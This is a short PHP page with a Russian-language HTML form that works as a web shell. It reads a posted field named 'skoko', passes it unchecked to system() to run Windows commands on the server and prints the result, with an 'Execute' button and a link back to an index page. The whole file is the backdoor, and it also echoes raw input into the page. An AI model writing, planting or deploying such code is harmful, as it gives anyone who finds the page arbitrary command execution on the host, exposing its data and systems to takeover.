<pre>
<?php
$skoko = $_POST['skoko'];
print $skoko. "<br>";
 system ( "cmd".$skoko);
if ( system ( $skoko ))
{
/*print "<br> с командной строки была запушена команда ".$esti;*/
}
else
{
print "<br> неудача";
}
?></table><br>
<table border="1" bordercolor="#B5B5B5" >
<tr><td><br>
<form action="sistem.php" method="post">
<input type="text" name="skoko" value="help">&nbsp;&nbsp;Comand line Windows&nbsp;&nbsp;
<input type="Submit" value="Выполнить">
</form>
</tr></td>
</table><br>
</pre>
<a href="index.php"><br>Вернуться</a>
